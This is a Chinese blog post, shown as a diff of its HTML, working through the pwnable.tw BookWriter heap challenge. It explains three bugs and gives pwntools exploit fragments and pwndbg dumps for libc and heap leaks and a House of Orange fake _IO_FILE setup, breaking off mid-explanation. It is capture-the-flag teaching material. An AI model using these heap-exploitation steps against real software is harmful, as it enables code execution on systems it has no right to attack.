@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn利用总结," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="接上一篇IO_FILE的利用总结，这一篇主要是几个题目。">
+<meta name="keywords" content="pwn利用总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO_FILE利用总结(二)">
+<meta property="og:url" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="接上一篇IO_FILE的利用总结，这一篇主要是几个题目。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/2.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/3.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/4.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/5.png">
+<meta property="og:updated_time" content="2019-04-23T09:09:46.783Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IO_FILE利用总结(二)">
+<meta name="twitter:description" content="接上一篇IO_FILE的利用总结，这一篇主要是几个题目。">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/"/>
+
+
+
+
+
+  <title>IO_FILE利用总结(二) | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/04/11/IO-FILE利用总结-二/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">IO_FILE利用总结(二)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-11T21:04:44+08:00">
+                2019-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>接上一篇IO_FILE的利用总结，这一篇主要是几个题目。<br><a id="more"></a></p>
+<h1 id="pwnable-tw-BookWriter"><a href="#pwnable-tw-BookWriter" class="headerlink" title="pwnable.tw BookWriter"></a>pwnable.tw BookWriter</h1><p>##题目概述</p>
+<p>这是pwnable.tw的一道题目，也是我学习IO_FILE结构遇到的第一个题目。这道题目有四个选择，可以add、view、edit、edit name四个功能，申请的page的大小没有限制。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the BookWriter !</span><br><span class="line">Author :<span class="number">1111111</span></span><br><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> <span class="number">1.</span> Add a page        </span><br><span class="line"> <span class="number">2.</span> View a page       </span><br><span class="line"> <span class="number">3.</span> Edit a page       </span><br><span class="line"> <span class="number">4.</span> Information       </span><br><span class="line"> <span class="number">5.</span> Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p>
+<p>开保护的情况：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<h2 id="题目漏洞"><a href="#题目漏洞" class="headerlink" title="题目漏洞"></a>题目漏洞</h2><p>这个题目有3个漏洞，首先在程序接受content的输入时调用了以下函数，该函数会判断字符串最后一个字符是否为’\n’，如果为’\n’，才会将’\n’替换为’\0’，但如果输入的content恰好是输入的size的长度，最后结尾无’\n’，在printf时可能导致数据泄露。这个函数在add page和edit page时都调用这个函数接受content的输入。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400856</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = _read_chk(<span class="number">0L</span>L, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v3 - <span class="number">1L</span>L + a1) == <span class="string">'\n'</span> )</span><br><span class="line">    *(_BYTE *)(v3 - <span class="number">1L</span>L + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第二个漏洞是程序在edit page时，edit输入完content之后，是调用strlen()来判断coontent的长度，并存入对应的size数组，但如果content的结尾没有’\0’，那strlen()会将next chunk的size域加进去，这样在下一次edit的时候，我们就可以覆盖next chunk的size域。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit_page</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index of page :"</span>);</span><br><span class="line">  v1 = sub_4008CD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of page:"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;page_list[<span class="number">8</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>);</span><br><span class="line">    sub_400856(*(_QWORD *)&amp;page_list[<span class="number">8</span> * v1], size_list[(<span class="keyword">unsigned</span> __int64)v1]);</span><br><span class="line">    size_list[(<span class="keyword">unsigned</span> __int64)v1] = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;page_list[<span class="number">8</span> * v1]); <span class="comment">//这个地方</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Not found !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第三个是add page时判断page的个数是否大于8,在edit page时是判断page的个数是否大于7,正确应该是只能添加8个page,因为page_list的大小为64个字节，因为add可以添加9个page,那么page_list会溢出，正好溢出到size_list，这样我们就能在add第九个page时修改第一个page的size，由于page_list中存储的是page在堆上的起始地址，地址的数字对于size来说都比较大，那么我们就能在edit第一个page的时候达到堆的溢出，溢出的长度很大。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_page</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// [sp+10h] [bp-10h]@3</span></span><br><span class="line">  __int64 size; <span class="comment">// [sp+18h] [bp-8h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> ) <span class="comment">//add 9个page</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)&amp;page_list[<span class="number">8</span> * i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit_page</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index of page :"</span>);</span><br><span class="line">  v1 = sub_4008CD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )  <span class="comment">//只能edit 7个page</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of page:"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/04/11/IO-FILE利用总结-二/1.png" alt="1"><br><img src="/2019/04/11/IO-FILE利用总结-二/2.png" alt="2"></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>首先，这道题目没有free，因为可以修改next chunk的size域，那我们可以，然后申请一个比top chunk大的内存来使top chunk进入unsorted bin中，从而获得一个freed chunk。<br>首先add一个page，第一次edit修改其size，第二次edit覆盖top chunk的size域。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#overwrite topchunk</span></span><br><span class="line">add_page(<span class="number">0x28</span>,<span class="string">'1'</span>*<span class="number">0x28</span>) <span class="comment">#idx=0</span></span><br><span class="line">edit_page(<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">0x28</span>)</span><br><span class="line">edit_page(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+<span class="string">'\xd1\x0f\x00'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>修改后的堆的分布如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span>  <span class="comment">#idx0</span></span><br><span class="line"><span class="number">0x603010</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603030</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000fd1</span>  <span class="comment">#top chunk</span></span><br></pre></td></tr></table></figure></p>
+<p>再申请一个大的chunk，旧的top chunk进入unsorted bin中。此时，旧的top chunk的fd和bk为main_arena+0x58，此时再add一个chunk，就可以泄露libc的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_page(<span class="number">0x1000</span>,<span class="string">'2222'</span>) <span class="comment">#idx=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">add_page(<span class="number">0x20</span>,<span class="string">'3'</span>) <span class="comment">#idx=2</span></span><br><span class="line">view_page(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Page #2 \nContent :\n'</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">leak_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) </span><br><span class="line">malloc_hook_addr = leak_addr + <span class="number">0x45</span> - <span class="number">0x58</span> - <span class="number">0x610</span></span><br><span class="line">libc_base = malloc_hook_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure></p>
+<p>page在堆上的分布如下所示。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x603000</span>  <span class="comment">#idx0</span></span><br><span class="line"><span class="number">0x603000</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x603010</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x603030</span>  <span class="comment">#idx2</span></span><br><span class="line"><span class="number">0x603030</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x603040</span>: <span class="number">0x00007ffff7dd2133</span>  <span class="number">0x00007ffff7dd2188</span> <span class="comment">#leak libc</span></span><br><span class="line"><span class="number">0x603050</span>: <span class="number">0x0000000000603030</span>  <span class="number">0x0000000000603030</span></span><br><span class="line"><span class="number">0x603060</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000f81</span></span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>g  <span class="number">0x624000</span>  <span class="comment">#idx1</span></span><br><span class="line"><span class="number">0x624000</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000001011</span></span><br><span class="line"><span class="number">0x624010</span>: <span class="number">0x0000000032323232</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x624020</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x624030</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>由于我们需要在堆上伪造fake _IO_FILE，因此还需要泄露堆的地址。这里使用第四个功能edit name，因为author存储在bss段上，长度为0x40，后面与它相邻的就是存储page addr的地址，当修改的author长度为0x40字节时，利用”%s”遇到’\0’才会截断的特点，泄露page在堆上的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'\n'</span>,drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">heap_base = u64(data) - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'heap_base:'</span>,hex(heap_base)</span><br><span class="line">p.recvuntil(<span class="string">'Do you want to change the author ? (yes:1 / no:0) '</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>修改后的author紧邻page_list。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602060</span></span><br><span class="line"><span class="number">0x602060</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span>  <span class="comment">#author</span></span><br><span class="line"><span class="number">0x602070</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x602080</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x602090</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x6020a0</span>: <span class="number">0x0000000000603010</span>  <span class="number">0x0000000000624010</span>  <span class="comment">#page_list</span></span><br></pre></td></tr></table></figure></p>
+<p>现在已经申请了idx0-idx2三个page，继续申请page至idx8，idx8也就是第九个page的地址覆盖size_list的前8个字节，将第一个page的size修改为较大的数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">9</span>): <span class="comment">#idx3~idx8</span></span><br><span class="line">   add_page(<span class="number">0x20</span>,str(i)*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x6020a0</span></span><br><span class="line"><span class="number">0x6020a0</span>: <span class="number">0x0000000000603010</span>  <span class="number">0x0000000000624010</span>  <span class="comment">#page_list</span></span><br><span class="line"><span class="number">0x6020b0</span>: <span class="number">0x0000000000603040</span>  <span class="number">0x0000000000603070</span></span><br><span class="line"><span class="number">0x6020c0</span>: <span class="number">0x00000000006030a0</span>  <span class="number">0x00000000006030d0</span></span><br><span class="line"><span class="number">0x6020d0</span>: <span class="number">0x0000000000603100</span>  <span class="number">0x0000000000603130</span></span><br><span class="line"><span class="number">0x6020e0</span>: <span class="number">0x0000000000603160</span>  <span class="number">0x0000000000001000</span>  <span class="comment">#size_list</span></span><br></pre></td></tr></table></figure>
+<p>这样在编辑idx0的内容时可以接受非常大的输入。<br>接下来进行house of orange的构造。首先是Unsorted Bin Attack，将unsorted bin中的chunk也就是旧的top chunk的bk修改为_IO_list_all-0x10，将_IO_list_all的内容修改为main_arena+0x58。<br>修改之前的chunk idx0和unsorted bin中的分布是：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x603000</span>  <span class="comment">#idx0</span></span><br><span class="line"><span class="number">0x603000</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x603010</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603030</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x603180</span>  <span class="comment">#unsorted bin 旧的top chunk</span></span><br><span class="line"><span class="number">0x603180</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000e61</span></span><br><span class="line"><span class="number">0x603190</span>: <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x6031a0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031b0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>在旧的top chunk处构造fake _IO_FILE，将其起始地址的内容覆写为”/bin/sh”，size域修改为0x61，使其进入到以_IO_list_all为头部的_IO_FILE链中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x2e</span> * p64(<span class="number">0</span>)  <span class="comment">#(0x603180 - 0x603010)/8 = 0x2e</span></span><br><span class="line">stream = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">stream += p64(<span class="number">0xdeadbeef</span>) + p64(IO_list_all<span class="number">-0x10</span>) <span class="comment">#fd bk</span></span><br></pre></td></tr></table></figure></p>
+<p>这里构造的条件是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc ./libio/libioP.h</span></span><br><span class="line">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="line"># define _IO_JUMPS_FUNC(THIS) \</span><br><span class="line">  (IO_validate_vtable                                                   \</span><br><span class="line">   (*(struct _IO_jump_t **) ((<span class="keyword">void</span> *) &amp;_IO_JUMPS_FILE_plus (THIS)        \</span><br><span class="line">                             + (THIS)-&gt;_vtable_offset)))</span><br><span class="line"># define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"># define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br><span class="line"># define _IO_vtable_offset(THIS) <span class="number">0</span></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p>
